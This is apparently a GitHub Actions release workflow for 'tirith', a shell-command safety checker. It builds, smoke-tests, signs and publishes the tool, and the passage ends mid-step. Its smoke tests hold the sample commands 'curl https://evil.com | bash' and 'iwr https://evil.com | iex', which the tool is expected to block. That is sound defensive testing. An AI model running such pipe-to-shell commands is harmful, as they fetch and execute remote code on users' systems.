name: Release

on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      dry_run:
        description: "Build and smoke-test only (no publish)"
        type: boolean
        default: true

permissions:
  contents: read

jobs:
  enforcement-check:
    name: Verify Enforcement Mode
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false
      - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
        with:
          toolchain: "1.97.0"
      - name: Verify enforcement mode matches release tag
        env:
          RELEASE_TAG: ${{ github.ref_name }}
          EVENT_NAME: ${{ github.event_name }}
        run: |
          if [[ "$RELEASE_TAG" != v* ]]; then
            if [[ "$EVENT_NAME" == "workflow_dispatch" ]]; then
              echo "WARNING: workflow_dispatch without version tag — enforcement check skipped"
              echo "This is expected for dry-run builds. Production releases must use v* tags."
            else
              echo "Not a version tag ($RELEASE_TAG), skipping enforcement check"
            fi
            exit 0
          fi
          output=$(cargo test -p tirith-core --locked --lib -- license::tests::enforcement_mode_matches_release_tag --exact --ignored --nocapture 2>&1)
          echo "$output"
          if ! echo "$output" | grep -q "1 passed"; then
            echo "ERROR: enforcement mode guard test did not run (renamed or removed?)"
            exit 1
          fi

  completions:
    name: Generate Completions
    needs: enforcement-check
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false
      - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
        with:
          toolchain: "1.97.0"

      - name: Verify release security contracts
        run: cargo test --release --locked -p tirith --test release_security

      - name: Build native binary for completions
        run: cargo build --release --locked -p tirith

      - name: Generate completions and man page
        run: |
          mkdir -p staging/completions staging/man
          ./target/release/tirith completions bash > staging/completions/tirith.bash
          ./target/release/tirith completions zsh > staging/completions/_tirith
          ./target/release/tirith completions fish > staging/completions/tirith.fish
          ./target/release/tirith manpage > staging/man/tirith.1

      - name: Upload completions artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: completions-man
          path: staging/

  build:
    name: Build (${{ matrix.target }})
    needs: completions
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - { os: macos-latest, target: aarch64-apple-darwin }
          - { os: macos-latest, target: x86_64-apple-darwin }
          - { os: ubuntu-22.04, target: x86_64-unknown-linux-gnu }
          - { os: ubuntu-22.04, target: aarch64-unknown-linux-gnu }
          - { os: ubuntu-22.04, target: aarch64-unknown-linux-musl }
          - { os: windows-latest, target: x86_64-pc-windows-msvc }
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
        with:
          toolchain: "1.97.0"
          targets: ${{ matrix.target }}

      - name: Install cross-compilation tools (Linux aarch64 gnu)
        if: matrix.target == 'aarch64-unknown-linux-gnu'
        run: |
          sudo apt-get update
          sudo apt-get install -y gcc-aarch64-linux-gnu
          echo "CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc" >> $GITHUB_ENV

      - name: Install cross-compilation tools (Linux aarch64 musl)
        if: matrix.target == 'aarch64-unknown-linux-musl'
        run: |
          sudo apt-get update
          sudo apt-get install -y gcc-aarch64-linux-gnu
          echo "CC_aarch64_unknown_linux_musl=aarch64-linux-gnu-gcc" >> $GITHUB_ENV
          echo "AR_aarch64_unknown_linux_musl=aarch64-linux-gnu-ar" >> $GITHUB_ENV
          echo "CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_LINKER=aarch64-linux-gnu-gcc" >> $GITHUB_ENV

      - name: Build release binary
        run: cargo build --release --locked --target ${{ matrix.target }} -p tirith

      # The aarch64 musl artifact ships for Android/Termux (Bionic libc cannot
      # run the glibc build). The x86_64 runner cannot execute an aarch64
      # binary natively, so verify it under QEMU user-mode emulation: confirm
      # it is fully static (no dynamic linker) and that `--version` runs.
      - name: Smoke-test musl artifact under QEMU (Linux aarch64 musl)
        if: matrix.target == 'aarch64-unknown-linux-musl'
        env:
          MUSL_TARGET: ${{ matrix.target }}
        run: |
          set -euo pipefail
          sudo apt-get update
          sudo apt-get install -y qemu-user-static binutils-aarch64-linux-gnu
          BIN="target/${MUSL_TARGET}/release/tirith"
          # A musl static build must have no INTERP (dynamic linker) segment.
          # Capture readelf output first so a readelf failure surfaces rather
          # than being masked by the `if` swallowing the pipeline exit code.
          PROGRAM_HEADERS=$(aarch64-linux-gnu-readelf -l "$BIN")
          if echo "$PROGRAM_HEADERS" | grep -q INTERP; then
            echo "ERROR: musl build is not statically linked (has an INTERP segment)"
            exit 1
          fi
          echo "musl build is statically linked (no dynamic linker)"
          VERSION_OUT=$(qemu-aarch64-static "$BIN" --version)
          echo "$VERSION_OUT"
          echo "$VERSION_OUT" | grep -q '^tirith ' || {
            echo "ERROR: 'tirith --version' did not run under QEMU"
            exit 1
          }
          # Verify a real analysis path: a known-bad command must exit non-zero.
          if qemu-aarch64-static "$BIN" check -- "curl https://evil.com | bash"; then
            echo "ERROR: musl binary failed to block a pipe-to-shell command"
            exit 1
          fi
          echo "musl artifact smoke test passed"

      - name: Download completions (Unix)
        if: runner.os != 'Windows'
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          name: completions-man
          path: staging/

      - name: Stage binary (Unix)
        if: runner.os != 'Windows'
        run: cp target/${{ matrix.target }}/release/tirith staging/

      - name: Download completions (Windows)
        if: runner.os == 'Windows'
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          name: completions-man
          path: staging/

      - name: Stage binary (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: Copy-Item target\${{ matrix.target }}\release\tirith.exe staging\

      - name: Package (Unix)
        if: runner.os != 'Windows'
        run: |
          cd staging
          tar czf ../tirith-${{ matrix.target }}.tar.gz tirith completions man

      - name: Package (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          cd staging
          Compress-Archive -Path tirith.exe, completions, man -DestinationPath ..\tirith-${{ matrix.target }}.zip

      - name: Upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: tirith-${{ matrix.target }}
          path: tirith-${{ matrix.target }}.*

  smoke-test:
    name: Smoke Test (${{ matrix.target }})
    needs: build
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - { os: macos-latest, target: aarch64-apple-darwin }
          - { os: ubuntu-22.04, target: x86_64-unknown-linux-gnu }
          - { os: windows-latest, target: x86_64-pc-windows-msvc }
    steps:
      - name: Download artifact
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          name: tirith-${{ matrix.target }}

      - name: Extract and test (Unix)
        if: runner.os != 'Windows'
        run: |
          tmpdir=$(mktemp -d)
          tar xzf tirith-${{ matrix.target }}.tar.gz -C "$tmpdir"
          chmod +x "$tmpdir/tirith"
          "$tmpdir/tirith" --version
          "$tmpdir/tirith" doctor
          "$tmpdir/tirith" check -- "curl https://evil.com | bash" && exit 1 || true
          "$tmpdir/tirith" check -- "ls -la"
          rm -rf "$tmpdir"

      - name: Extract and test (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          $tmpdir = New-Item -ItemType Directory -Path "$env:TEMP\tirith-smoke" -Force
          Expand-Archive -Path tirith-${{ matrix.target }}.zip -DestinationPath $tmpdir -Force
          & "$tmpdir\tirith.exe" --version
          & "$tmpdir\tirith.exe" doctor
          & "$tmpdir\tirith.exe" check --shell powershell -- "iwr https://evil.com | iex"
          if ($LASTEXITCODE -eq 0) { exit 1 }
          & "$tmpdir\tirith.exe" check -- "dir"
          if ($LASTEXITCODE -ne 0) { exit 1 }
          Remove-Item -Recurse -Force $tmpdir -ErrorAction SilentlyContinue

  attest-packages:
    name: Attest Linux Packages
    needs: [build-deb, build-rpm]
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    permissions:
      contents: read
      attestations: write
      id-token: write
    steps:
      - name: Download Debian package
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          name: tirith-deb
          path: packages

      - name: Download RPM package
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          name: tirith-rpm
          path: packages

      - name: Verify exact package subject set
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          VER="${VERSION#v}"
          expected_deb="packages/tirith_${VER}_amd64.deb"
          if [ ! -f "$expected_deb" ]; then
            echo "ERROR: expected Debian package is missing: ${expected_deb}"
            exit 1
          fi

          shopt -s nullglob
          rpms=(packages/tirith-"${VER}"-*.x86_64.rpm)
          packages=(packages/*.deb packages/*.rpm)
          if [ "${#rpms[@]}" -ne 1 ]; then
            echo "ERROR: expected exactly one x86_64 RPM for ${VER}, found ${#rpms[@]}"
            exit 1
          fi
          if [ "${#packages[@]}" -ne 2 ]; then
            echo "ERROR: expected exactly one .deb and one .rpm subject, found ${#packages[@]} package files"
            printf '%s\n' "${packages[@]}"
            exit 1
          fi

          sha256sum -- "$expected_deb" "${rpms[0]}"

      - name: Generate package build provenance
        uses: actions/attest@a1948c3f048ba23858d222213b7c278aabede763 # v4.1.1
        with:
          subject-path: |
            packages/*.deb
            packages/*.rpm

      - name: Verify package provenance before publication
        env:
          GH_TOKEN: ${{ github.token }}
          EXPECTED_CERT_IDENTITY: https://github.com/${{ github.repository }}/.github/workflows/release.yml@${{ github.ref }}
        run: |
          set -euo pipefail
          shopt -s nullglob
          packages=(packages/*.deb packages/*.rpm)
          if [ "${#packages[@]}" -ne 2 ]; then
            echo "ERROR: package subject set changed before attestation verification"
            exit 1
          fi

          for package in "${packages[@]}"; do
            gh attestation verify "$package" \
              --repo "$GITHUB_REPOSITORY" \
              --cert-identity "$EXPECTED_CERT_IDENTITY" \
              --source-digest "$GITHUB_SHA" \
              --source-ref "$GITHUB_REF" \
              --signer-digest "$GITHUB_SHA" \
              --predicate-type https://slsa.dev/provenance/v1
          done

  release:
    name: Create Release
    needs: [smoke-test, build-deb, build-rpm, attest-packages]
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    permissions:
      contents: write
      id-token: write
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - name: Download all artifacts
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: artifacts
          merge-multiple: true

      - name: Remove completions-man directories (not for release)
        run: rm -rf artifacts/completions artifacts/man

      - name: Stage installer and verify complete release payload
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          VER="${VERSION#v}"
          cp scripts/install.sh artifacts/install.sh

          required=(
            install.sh
            tirith-aarch64-apple-darwin.tar.gz
            tirith-x86_64-apple-darwin.tar.gz
            tirith-aarch64-unknown-linux-gnu.tar.gz
            tirith-aarch64-unknown-linux-musl.tar.gz
            tirith-x86_64-unknown-linux-gnu.tar.gz
            tirith-x86_64-pc-windows-msvc.zip
            "tirith_${VER}_amd64.deb"
          )
          for asset in "${required[@]}"; do
            if [ ! -f "artifacts/${asset}" ]; then
              echo "ERROR: required release payload is missing: ${asset}"
              exit 1
            fi
          done

          shopt -s nullglob
          rpms=(artifacts/tirith-"${VER}"-*.x86_64.rpm)
          if [ "${#rpms[@]}" -ne 1 ]; then
            echo "ERROR: expected exactly one x86_64 RPM for ${VER}, found ${#rpms[@]}"
            exit 1
          fi
          payload_count=$(find artifacts -mindepth 1 -maxdepth 1 -type f | wc -l)
          expected_count=$((${#required[@]} + 1))
          if [ "$payload_count" -ne "$expected_count" ]; then
            echo "ERROR: release payload has ${payload_count} files; expected ${expected_count}"
            find artifacts -mindepth 1 -maxdepth 1 -print | sort
            exit 1
          fi

      - name: Generate complete release checksum manifest
        run: |
          set -euo pipefail
          cd artifacts
          mapfile -d '' payloads < <(find . -mindepth 1 -maxdepth 1 -type f -print0 | sort -z)
          for index in "${!payloads[@]}"; do
            payloads[$index]="${payloads[$index]#./}"
          done
          sha256sum -- "${payloads[@]}" > checksums.txt
          cat checksums.txt

      - name: Install cosign
        uses: sigstore/cosign-installer@398d4b0eeef1380460a10c8013a76f728fb906ac # v3

      - name: Sign checksums
        run: |
          set -euo pipefail
          cd artifacts
          cosign sign-blob --yes \
            --output-signature checksums.txt.sig \
            --output-certificate checksums.txt.pem \
            checksums.txt

      - name: Verify every published payload is signed
        run: |
          set -euo pipefail
          cd artifacts
          sha256sum --check --strict checksums.txt
          manifest_count=$(wc -l < checksums.txt)
          payload_count=$(find . -mindepth 1 -maxdepth 1 -type f \
            ! -name checksums.txt \
            ! -name checksums.txt.sig \
            ! -name checksums.txt.pem | wc -l)
          if [ "$manifest_count" -ne "$payload_count" ]; then
            echo "ERROR: signed manifest has ${manifest_count} entries for ${payload_count} payloads"
            exit 1
          fi

      - name: Create GitHub Release
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
        with:
          generate_release_notes: true
          files: |
            artifacts/*

  publish-crates:
    name: Publish to crates.io
    needs: release
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false
      - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
        with:
          toolchain: "1.97.0"

      - name: Publish tirith-core
        run: |
          set +e
          output=$(cargo publish -p tirith-core --locked 2>&1)
          status=$?
          set -e
          echo "$output"
          if [ $status -ne 0 ] && ! echo "$output" | grep -qiE "already (uploaded|exists)"; then
            exit $status
          fi
        env:
          CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}

      - name: Wait for tirith-core on crates.io
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          VER="${VERSION#v}"
          for attempt in $(seq 1 60); do
            HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: tirith-release-ci (https://github.com/sheeki03/tirith)" "https://crates.io/api/v1/crates/tirith-core/${VER}")
            if [ "$HTTP_CODE" = "200" ]; then
              echo "tirith-core ${VER} is visible on crates.io"
              exit 0
            fi
            echo "Waiting for tirith-core ${VER} to appear on crates.io (${attempt}/60, HTTP ${HTTP_CODE})..."
            sleep 10
          done
          echo "timed out waiting for tirith-core ${VER} to appear on crates.io"
          exit 1

      - name: Publish tirith
        run: |
          set +e
          output=$(cargo publish -p tirith --locked 2>&1)
          status=$?
          set -e
          echo "$output"
          if [ $status -ne 0 ] && ! echo "$output" | grep -qiE "already (uploaded|exists)"; then
            exit $status
          fi
        env:
          CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}

  publish-homebrew:
    name: Update Homebrew Tap
    needs: release
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          path: source
          persist-credentials: false

      - name: Download all artifacts
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: artifacts
          merge-multiple: true

      - name: Checkout tap repo
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          repository: sheeki03/homebrew-tap
          token: ${{ secrets.TAP_GITHUB_TOKEN }}
          path: homebrew-tap

      - name: Update formula
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          VER="${VERSION#v}"
          mkdir -p homebrew-tap/Formula
          cp source/packaging/homebrew/tirith.rb homebrew-tap/Formula/tirith.rb
          cd artifacts
          SHA_AA=$(sha256sum tirith-aarch64-apple-darwin.tar.gz | cut -d' ' -f1)
          SHA_XA=$(sha256sum tirith-x86_64-apple-darwin.tar.gz | cut -d' ' -f1)
          SHA_AL=$(sha256sum tirith-aarch64-unknown-linux-gnu.tar.gz | cut -d' ' -f1)
          SHA_XL=$(sha256sum tirith-x86_64-unknown-linux-gnu.tar.gz | cut -d' ' -f1)
          cd ..
          sed -i "s/version \"[0-9.]*\"/version \"${VER}\"/" homebrew-tap/Formula/tirith.rb
          sed -i "s|releases/download/v[0-9.]*|releases/download/${VERSION}|g" homebrew-tap/Formula/tirith.rb
          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_AA}\"/}" homebrew-tap/Formula/tirith.rb
          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_XA}\"/}" homebrew-tap/Formula/tirith.rb
          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_AL}\"/}" homebrew-tap/Formula/tirith.rb
          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_XL}\"/}" homebrew-tap/Formula/tirith.rb

      - name: Push formula
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          cd homebrew-tap
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add Formula/tirith.rb
          git commit -m "tirith $VERSION"
          git push

  publish-npm:
    name: Publish npm Packages
    needs: release
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write  # Required for npm provenance (OIDC)
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 20
          registry-url: https://registry.npmjs.org

      - name: Download all artifacts
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: artifacts
          merge-multiple: true

      - name: Prepare platform packages
        run: |
          set -euo pipefail

          VERSION="${GITHUB_REF_NAME#v}"

          # Map: npm-dir archive-name binary-name
          declare -A NPM_MAP=(
            ["darwin-arm64"]="tirith-aarch64-apple-darwin.tar.gz:tirith"
            ["darwin-x64"]="tirith-x86_64-apple-darwin.tar.gz:tirith"
            ["linux-x64"]="tirith-x86_64-unknown-linux-gnu.tar.gz:tirith"
            ["linux-arm64"]="tirith-aarch64-unknown-linux-gnu.tar.gz:tirith"
            ["win32-x64"]="tirith-x86_64-pc-windows-msvc.zip:tirith.exe"
          )

          for platform in "${!NPM_MAP[@]}"; do
            IFS=':' read -r archive binary <<< "${NPM_MAP[$platform]}"
            pkg_dir="npm/${platform}"

            # Extract binary into package bin/
            tmpdir=$(mktemp -d)
            if [[ "$archive" == *.zip ]]; then
              unzip -o "artifacts/${archive}" -d "$tmpdir"
            else
              tar xzf "artifacts/${archive}" -C "$tmpdir"
            fi

            mkdir -p "${pkg_dir}/bin"
            cp "${tmpdir}/${binary}" "${pkg_dir}/bin/${binary}"
            chmod +x "${pkg_dir}/bin/${binary}" 2>/dev/null || true
            rm -rf "$tmpdir"

            # Update version in package.json
            cd "$pkg_dir"
            node -e "
              const pkg = require('./package.json');
              pkg.version = '${VERSION}';
              require('fs').writeFileSync('package.json', JSON.stringify(pkg, null, 2) + '\n');
            "
            cd -
          done

          # Update root package version
          cd npm/tirith
          node -e "
            const pkg = require('./package.json');
            pkg.version = '${VERSION}';
            for (const dep of Object.keys(pkg.optionalDependencies || {})) {
              pkg.optionalDependencies[dep] = '${VERSION}';
            }
            require('fs').writeFileSync('package.json', JSON.stringify(pkg, null, 2) + '\n');
          "
          cd -

          # Ensure launcher has correct permissions and line endings
          chmod +x npm/tirith/bin/tirith

      - name: Publish platform packages
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          set -euo pipefail
          for dir in npm/darwin-arm64 npm/darwin-x64 npm/linux-x64 npm/linux-arm64 npm/win32-x64; do
            echo "Publishing $(basename $dir)..."
            cd "$dir"
            set +e
            output=$(npm publish --access public --provenance 2>&1)
            status=$?
            set -e
            echo "$output"
            if [ $status -ne 0 ] && ! echo "$output" | grep -qiE "previously published version|previously published versions|cannot publish over the previously published"; then
              exit $status
            fi
            cd -
          done

      - name: Publish root package
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          set -euo pipefail
          cd npm/tirith
          set +e
          output=$(npm publish --access public --provenance 2>&1)
          status=$?
          set -e
          echo "$output"
          if [ $status -ne 0 ] && ! echo "$output" | grep -qiE "previously published version|previously published versions|cannot publish over the previously published"; then
            exit $status
          fi

  publish-scoop:
    name: Update Scoop Bucket
    needs: release
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          path: source
          persist-credentials: false

      - name: Download all artifacts
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: artifacts
          merge-multiple: true

      - name: Checkout scoop bucket
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          repository: sheeki03/scoop-tirith
          token: ${{ secrets.TAP_GITHUB_TOKEN }}
          path: scoop-tirith

      - name: Update manifest
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          VER="${VERSION#v}"
          HASH=$(sha256sum artifacts/tirith-x86_64-pc-windows-msvc.zip | cut -d' ' -f1)
          mkdir -p scoop-tirith/bucket
          cp source/packaging/scoop/tirith.json scoop-tirith/bucket/tirith.json
          sed -i "s/\"version\": \"[0-9.]*\"/\"version\": \"${VER}\"/" scoop-tirith/bucket/tirith.json
          # Require >= 1 digit after `v` so this only rewrites the version-pinned
          # URL and never the autoupdate template's literal `v$version` (a bare
          # `v[0-9.]*` matched zero digits and produced `v0.3.2$version`).
          sed -i "s|releases/download/v[0-9][0-9.]*|releases/download/${VERSION}|" scoop-tirith/bucket/tirith.json
          sed -i "s/\"hash\": \"PLACEHOLDER\"/\"hash\": \"${HASH}\"/" scoop-tirith/bucket/tirith.json

      - name: Push manifest
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          cd scoop-tirith
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add bucket/tirith.json
          git commit -m "tirith $VERSION"
          git push

  publish-docker:
    name: Publish Docker Image
    needs: release
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - name: Download all artifacts
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: artifacts
          merge-multiple: true

      - name: Prepare per-platform build contexts
        run: |
          set -euo pipefail
          # amd64
          mkdir -p docker-amd64/bin docker-amd64/shell
          tar xzf artifacts/tirith-x86_64-unknown-linux-gnu.tar.gz -C docker-amd64/bin tirith
          cp -r shell/* docker-amd64/shell/
          cp Dockerfile docker-amd64/

          # arm64
          mkdir -p docker-arm64/bin docker-arm64/shell
          tar xzf artifacts/tirith-aarch64-unknown-linux-gnu.tar.gz -C docker-arm64/bin tirith
          cp -r shell/* docker-arm64/shell/
          cp Dockerfile docker-arm64/

      - name: Set up QEMU
        uses: docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130 # v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3

      - name: Login to GHCR
        uses: docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9 # v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract version
        id: version
        run: echo "VERSION=${GITHUB_REF_NAME#v}" >> $GITHUB_OUTPUT

      - name: Build and push (amd64)
        uses: docker/build-push-action@ca052bb54ab0790a636c9b5f226502c73d547a25 # v5
        with:
          context: docker-amd64
          platforms: linux/amd64
          push: true
          tags: ghcr.io/sheeki03/tirith:${{ steps.version.outputs.VERSION }}-amd64

      - name: Build and push (arm64)
        uses: docker/build-push-action@ca052bb54ab0790a636c9b5f226502c73d547a25 # v5
        with:
          context: docker-arm64
          platforms: linux/arm64
          push: true
          tags: ghcr.io/sheeki03/tirith:${{ steps.version.outputs.VERSION }}-arm64

      - name: Create and push multi-arch manifest
        env:
          VERSION: ${{ steps.version.outputs.VERSION }}
        run: |
          docker buildx imagetools create \
            -t ghcr.io/sheeki03/tirith:latest \
            -t "ghcr.io/sheeki03/tirith:${VERSION}" \
            "ghcr.io/sheeki03/tirith:${VERSION}-amd64" \
            "ghcr.io/sheeki03/tirith:${VERSION}-arm64"

  build-deb:
    name: Build Debian Package
    needs: smoke-test
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
        with:
          toolchain: "1.97.0"

      - name: Install verified cargo-deb
        env:
          CARGO_DEB_VERSION: "3.7.0"
          CARGO_DEB_SHA256: a40a401a79fd1bd9d2cb41fd783d0c80f3504f657002bfae49dfd55049dce8f8
        run: |
          set -euo pipefail
          archive="${RUNNER_TEMP}/cargo-deb-${CARGO_DEB_VERSION}.crate"
          source_dir="${RUNNER_TEMP}/cargo-deb-source"
          install_root="${RUNNER_TEMP}/cargo-deb-install"
          curl --proto '=https' --tlsv1.2 -fsSL \
            "https://static.crates.io/crates/cargo-deb/cargo-deb-${CARGO_DEB_VERSION}.crate" \
            -o "$archive"
          printf '%s  %s\n' "$CARGO_DEB_SHA256" "$archive" | sha256sum --check --strict
          mkdir -p "$source_dir" "$install_root"
          tar xzf "$archive" -C "$source_dir"
          cargo install --locked \
            --path "$source_dir/cargo-deb-${CARGO_DEB_VERSION}" \
            --root "$install_root"
          installed_version=$("$install_root/bin/cargo-deb" --version)
          if [ "$installed_version" != "cargo-deb ${CARGO_DEB_VERSION}" ]; then
            echo "ERROR: installed unexpected cargo-deb build: ${installed_version}"
            exit 1
          fi
          echo "$install_root/bin" >> "$GITHUB_PATH"

      # cargo-deb requires assets relative to crates/tirith/, but shell hooks
      # live at repo root. This directory is gitignored and only exists in CI.
      - name: Copy shell hooks to assets
        run: |
          mkdir -p crates/tirith/assets/shell/lib
          cp shell/tirith.sh crates/tirith/assets/shell/
          cp shell/lib/*.zsh crates/tirith/assets/shell/lib/
          cp shell/lib/*.bash crates/tirith/assets/shell/lib/
          cp shell/lib/*.fish crates/tirith/assets/shell/lib/
          cp shell/lib/*.ps1 crates/tirith/assets/shell/lib/

      - name: Download canonical Linux x64 release artifact
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          name: tirith-x86_64-unknown-linux-gnu
          path: canonical

      # Package the SAME binary that ships in the tarball and that `tirith
      # verify-self` compares against, instead of a separate rebuild. A separate
      # build is not byte-identical, which made apt-installed binaries fail
      # verify-self (issue #146). cargo-deb --no-build picks up target/release/tirith.
      - name: Stage canonical binary for cargo-deb
        run: |
          set -euo pipefail
          mkdir -p crates/tirith/target/release
          tar xzf canonical/tirith-x86_64-unknown-linux-gnu.tar.gz \
            -C crates/tirith/target/release tirith
          chmod +x crates/tirith/target/release/tirith
          echo "Packaging canonical binary:"
          sha256sum crates/tirith/target/release/tirith

      - name: Generate completions and manpage for .deb
        run: |
          mkdir -p crates/tirith/assets/completions crates/tirith/assets/man
          ./crates/tirith/target/release/tirith completions bash > crates/tirith/assets/completions/tirith.bash
          ./crates/tirith/target/release/tirith completions zsh > crates/tirith/assets/completions/_tirith
          ./crates/tirith/target/release/tirith completions fish > crates/tirith/assets/completions/tirith.fish
          ./crates/tirith/target/release/tirith manpage > crates/tirith/assets/man/tirith.1

      - name: Build .deb with cargo-deb
        run: |
          VERSION="${GITHUB_REF_NAME#v}"
          cd crates/tirith
          # --no-strip: package the staged canonical binary byte-for-byte (it is
          # already stripped by [profile.release]); stripping again could perturb
          # bytes and re-break verify-self byte-identity (issue #146).
          CARGO_TARGET_DIR=target cargo deb --no-build --no-strip
          mv target/debian/*.deb ../../tirith_${VERSION}_amd64.deb

      # Guard against issue #146 regressing: the binary inside the .deb MUST be
      # byte-identical to the canonical release binary, or apt users fail
      # `tirith verify-self`.
      - name: Verify .deb binary matches the canonical release binary
        run: |
          set -euo pipefail
          mkdir -p deb-extract
          dpkg-deb -x tirith_*.deb deb-extract
          DEB_BIN=$(find deb-extract -type f -name tirith | head -1)
          if [ -z "$DEB_BIN" ]; then
            echo "ERROR: no tirith binary found inside the .deb"
            exit 1
          fi
          DEB_SHA=$(sha256sum "$DEB_BIN" | cut -d' ' -f1)
          CANON_SHA=$(sha256sum crates/tirith/target/release/tirith | cut -d' ' -f1)
          echo "deb binary:       $DEB_SHA  ($DEB_BIN)"
          echo "canonical binary: $CANON_SHA"
          if [ "$DEB_SHA" != "$CANON_SHA" ]; then
            echo "ERROR: .deb binary does not match the canonical release binary;"
